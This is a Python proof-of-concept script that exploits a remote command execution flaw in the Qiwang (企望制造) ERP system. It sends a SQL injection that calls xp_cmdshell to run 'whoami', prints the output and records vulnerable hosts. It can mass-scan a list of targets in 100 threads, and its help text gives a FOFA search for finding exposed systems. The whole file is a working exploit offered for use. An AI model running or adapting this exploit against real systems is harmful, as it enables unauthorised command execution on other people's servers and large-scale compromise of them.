#-*- coding: utf-8 -*-
import argparse,sys,requests,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    test = """ 
   ____  _____               _   _  _____ 
  / __ \|_   _|        /\   | \ | |/ ____|
 | |  | | | |_      __/  \  |  \| | |  __ 
 | |  | | | \ \ /\ / / /\ \ | . ` | | |_ |
 | |__| |_| |\ V  V / ____ \| |\  | |__| |
  \___\_\_____\_/\_/_/    \_\_| \_|\_____|
                                          
                                                                tag : 企望制造ERP系统REC漏洞 poc
                                                                             @author : Gui1de
    """
    print(test)



headers = {
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Connection": "close",
    "Content-Type": "application/x-www-form-urlencoded"
}

def poc(target):
    if "http://" in target:
        print('请去掉"http://"后重新输入')
    else:
        url = "http://"+target+"/mainFunctions/comboxstore.action"
        data= {"comboxsql": "exec xp_cmdshell 'whoami'"}
        try:
            res = requests.post(url,headers=headers,data=data,verify=False,timeout=5).text
            if '"Item"' in res:
                print(f"[+]{target} 存在漏洞\n输出结果为{res}\n")
                    # print("点击"+url2+"进行验证")
                with open("result.txt", "a+", encoding="utf-8") as f:
                    f.write(target + "\n")
            else:
                print(f"[-] {target} 不存在漏洞")
        except:
            print(f"[*] {target} 请求失败")

def main():
    banner()
    parser = argparse.ArgumentParser(description='企望制造ERP系统REC漏洞fofa语法:title="企望制造ERP系统"')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()